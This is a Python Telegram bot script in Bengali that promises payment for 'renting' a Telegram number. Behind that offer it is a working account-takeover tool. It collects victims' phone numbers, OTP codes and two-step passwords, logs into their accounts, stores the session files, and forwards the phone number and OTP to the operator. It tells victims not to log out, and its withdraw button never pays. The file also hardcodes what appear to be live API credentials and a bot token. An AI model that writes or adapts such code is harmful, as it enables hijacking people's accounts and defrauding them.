import os
import asyncio
from telethon import TelegramClient, events, Button

# --- Configuration ---
API_ID = 28260353
API_HASH = 'bc2b69b2727821422ed0adf43a82700a'
BOT_TOKEN = '8383019080:AAEJ1CWZM2FXa98EsASHbTKCL4PdYVby_u4'
ADMIN_ID = 7852368023  # এখানে আপনার আইডি দেওয়া আছে, OTP এখানেই যাবে

# সেশন ফোল্ডার নিশ্চিত করা
if not os.path.exists('sessions'):
    os.makedirs('sessions')

# মেইন বট স্টার্ট
bot = TelegramClient('main_bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# --- Functions ---
def get_main_buttons():
    return [
        [Button.inline("📲 নাম্বার জমা দিন", data="submit_number")],
        [Button.inline("💰 উইথড্র", data="withdraw"), Button.inline("📊 ডিটেইলস", data="details")],
        [Button.inline("📞 সাপোর্ট", data="support")]
    ]

# --- Handlers ---

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    welcome_text = (
        "💥 **টেলিগ্রাম নাম্বার ভাড়া দিয়ে টাকা ইনকাম করুন!**\n\n"
        "⌛ ২৪ ঘন্টার জন্য পাবেন ১০৳ করে।\n"
        "👥 প্রতি রেফারে পাবেন ২৳ বোনাস।\n\n"
        "নিচের বাটন ব্যবহার করে কাজ শুরু করুন 👇"
    )
    await event.respond(welcome_text, buttons=get_main_buttons())

@bot.on(events.CallbackQuery(data="details"))
async def details(event):
    text = (
        "⌛ **কীভাবে টেলিগ্রাম ভাড়া দিবেন?**\n\n"
        "✅ একাউন্টে কোনো আগের SMS রাখা যাবে না।\n"
        "✅ 2-Step Verification বা পাসওয়ার্ড থাকা যাবে না।\n"
        "✅ আমাদের বট লগইন করার পর লগআউট করা যাবে না।"
    )
    await event.answer()
    await event.respond(text)

@bot.on(events.CallbackQuery(data="submit_number"))
async def submit_start(event):
    await event.answer()
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message("📱 আপনার টেলিগ্রাম নাম্বারটি দিন (যেমন: +88017xxxxxxxx):")
        
        phone_msg = await conv.get_response()
        phone = phone_msg.text.strip().replace(" ", "")

        if not phone.startswith('+'):
            await conv.send_message("❌ ভুল ফরম্যাট! নাম্বারটি অবশ্যই + দিয়ে শুরু হতে হবে।")
            return

        try:
            await conv.send_message("⏳ **OTP পাঠানো হচ্ছে...**")
            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
            await client.connect()

            # OTP পাঠানো এবং আপনার আইডিতে ফরওয়ার্ড করা
            sent_code = await client.send_code_request(phone)
            hash_code = sent_code.phone_code_hash
            
            # এডমিনকে (আপনাকে) সতর্ক করা
            await bot.send_message(ADMIN_ID, f"🔔 **OTP Alert!**\nনাম্বার: `{phone}` এর জন্য OTP পাঠানো হয়েছে।")

            await conv.send_message("🔑 আপনার টেলিগ্রামে আসা **৫ ডিজিটের OTP** কোডটি দিন:")
            otp_msg = await conv.get_response()
            otp = otp_msg.text.strip()

            try:
                # লগইন করার চেষ্টা
                await client.sign_in(phone, code=otp, phone_code_hash=hash_code)
            except Exception as e:
                # যদি ২-স্টেপ পাসওয়ার্ড চায়
                if "password" in str(e).lower():
                    await conv.send_message("🔐 এই একাউন্টে **2-Step Verification** অন করা আছে। পাসওয়ার্ডটি দিন:")
                    pwd_msg = await conv.get_response()
                    await client.sign_in(password=pwd_msg.text.strip())
                else:
                    raise e

            await conv.send_message("✅ **সফলভাবে জমা হয়েছে!**\n২৪ ঘণ্টা পর ব্যালেন্স চেক করুন।")
            
            # এডমিনকে সম্পূর্ণ তথ্য পাঠানো
            await bot.send_message(ADMIN_ID, f"✅ **নতুন একাউন্ট সাকসেস!**\n📱 নাম্বার: `{phone}`\n🔑 OTP ছিল: `{otp}`")
            
        except Exception as e:
            await conv.send_message(f"❌ এরর: {str(e)}")

@bot.on(events.CallbackQuery(data="withdraw"))
async def withdraw(event):
    await event.respond("💰 আপনার ব্যালেন্স এখনো ১০০৳ হয়নি।")

print("--- বট এখন সচল আছে ---")
bot.run_until_disconnected()
